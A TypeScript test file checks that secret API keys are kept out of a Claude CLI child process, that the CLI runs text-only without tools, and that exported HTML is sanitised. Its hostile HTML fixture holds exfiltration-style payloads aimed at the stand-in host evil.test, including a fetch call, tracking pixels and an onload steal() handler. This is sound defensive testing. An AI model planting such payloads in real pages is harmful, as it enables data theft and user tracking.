import { claudeTextOnlyArgs, safeClaudeCliEnv } from '../src/lib/runtime-env';
import { artifactSafeHtml, MAX_HTML_BYTES } from '../src/lib/project-security';

process.env.MUAPI_API_KEY = 'must-not-cross';
process.env.FAL_KEY = 'must-not-cross';
process.env.GOOGLE_CREDENTIALS_JSON = 'must-not-cross';
process.env.GITHUB_TOKEN = 'must-not-cross';
process.env.OPENAI_API_KEY = 'must-not-cross';
process.env.ANTHROPIC_API_KEY = 'must-not-cross';
process.env.CLAUDE_CLI_MODEL = 'allowed-model-name';

const child = safeClaudeCliEnv();
for (const forbidden of [
  'MUAPI_API_KEY',
  'FAL_KEY',
  'GOOGLE_CREDENTIALS_JSON',
  'GITHUB_TOKEN',
  'OPENAI_API_KEY',
  'ANTHROPIC_API_KEY',
]) {
  if (forbidden in child) throw new Error(`${forbidden} crossed into Claude CLI env`);
}
if (child.CLAUDE_CLI_MODEL !== 'allowed-model-name') {
  throw new Error('Non-secret CLI model configuration was lost');
}

const args = claudeTextOnlyArgs('write only text');
for (const required of [
  '--tools',
  '--safe-mode',
  '--disable-slash-commands',
  '--no-session-persistence',
  '--no-chrome',
]) {
  if (!args.includes(required)) throw new Error(`Claude text-only flag missing: ${required}`);
}
if (args[args.indexOf('--tools') + 1] !== '') {
  throw new Error('Claude tools were not disabled');
}

const hostileHtml = artifactSafeHtml(`<!doctype html><html><head>
<meta http-equiv="refresh" content="0;url=https://evil.test">
<link rel="stylesheet" href="https://evil.test/a.css"><style>@import "https://evil.test/b";
.x{background:url(https://evil.test/pixel)}</style></head><body onload="steal()">
<script>fetch('https://evil.test/secret')</script><iframe src="https://evil.test"></iframe>
<img src="https://evil.test/pixel"><a href="javascript:steal()">x</a></body></html>`);
for (const forbidden of ['<script', '<iframe', '<link', 'http-equiv="refresh"', 'https://evil.test']) {
  if (hostileHtml.toLowerCase().includes(forbidden)) {
    throw new Error(`Downloadable project HTML retained unsafe content: ${forbidden}`);
  }
}
if (!hostileHtml.includes('Content-Security-Policy')) {
  throw new Error('Downloadable project HTML is missing its CSP');
}
let sizeRejected = false;
try {
  artifactSafeHtml(`<html><style></style><body>${'x'.repeat(MAX_HTML_BYTES + 1)}</body></html>`);
} catch {
  sizeRejected = true;
}
if (!sizeRejected) throw new Error('Oversized project HTML was accepted');
